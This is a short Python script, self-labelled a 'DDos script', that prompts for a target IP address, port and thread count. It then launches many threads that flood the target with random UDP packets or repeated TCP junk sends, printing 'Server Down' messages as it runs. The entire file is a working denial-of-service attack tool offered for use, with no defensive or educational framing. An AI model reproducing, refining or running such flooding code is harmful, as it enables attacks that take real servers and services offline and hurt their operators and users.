#by Mamank Sa-mp
import colorama
import random
import time
import socket
import threading
import sys
import os
# Colors
yellow='\033[92m'
cyan='\033[92m'
pink='\033[92m'
green = '\033[92m'
red ='\033[92m'
white ='\033[92m'
black ='\033[92m'
# Requests

os.system("clear")
print(green + f"З А Г Р У З К А....")
time.sleep(1.5)
os.system("clear")

print("=================")
print("=======🅳🅴🅳🅲🅾🅳🅴 🆃🅴🅰🅼=======")
print("===DDos script===")
ip = str(input(" Ip ════> "))
port = int(input(" Port ════> "))
choice = str(input(" Lanjut gak ?(y/n) ════> "))
times = int(input(" Packets time ════> "))
threads = int(input(" Потоки (~800 лучше) ════> "))

os.system("clear")
os.system("figlet Attack Starting")
print ("[                   ] 0% ")
time.sleep(3)
print ("[=====              ] 25%")
time.sleep(3)
print ("[==========         ] 50%")
time.sleep(3)
print ("[===============    ] 75%")
time.sleep(3)
print ("[===================] 100%")
time.sleep(2)
def run():
  data = random._urandom(1024)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +" |####/[LOG] GO {sent}\####|")
    except:
      print("[!] |####/[LOG] GO {sent}\####|")

def run2():
  data = random._urandom(16)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +" MANTAPPPPPP")
    except:
      s.close()
      print("[*] Server Down ")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()
